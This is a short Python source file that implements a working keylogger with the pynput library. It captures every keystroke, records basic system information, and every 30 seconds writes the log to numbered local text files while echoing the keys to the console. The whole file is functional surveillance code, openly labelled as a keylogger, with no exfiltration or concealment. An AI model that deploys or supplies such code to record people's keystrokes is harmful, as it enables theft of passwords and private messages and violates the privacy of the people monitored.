# -*- coding: utf-8 -*-
"""
Last updated on Fri Apr 16 22:46:04 2021
@author: Jorge Favela
"""

import platform
import threading
from pynput import keyboard


class KeyLogger:
    def __init__(self, time_interval, cnt=0):
        self.log = "KeyLogger Started..."
        self.interval = time_interval
        self.cnt=cnt

    def appendlog(self, string):
        self.log = self.log + ' ' + string

    def save_data(self, key):
        print(key, end='')
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            elif key == key.enter:
                current_key = "ENTER"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def report(self):
        with open('log'+str(self.cnt)+'.txt', 'a') as lg:
            self.cnt+=1
            lg.write(self.log)
            print(self.log)
            self.log = "\n"
            timer = threading.Timer(self.interval, self.report)
            timer.start()

    def system_information(self):
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog('\n'+plat+'\n')
        self.appendlog(system+'\n')
        self.appendlog(machine+'\n')

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        self.system_information()
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

cnt=0
keylogger = KeyLogger(30)
keylogger.run()

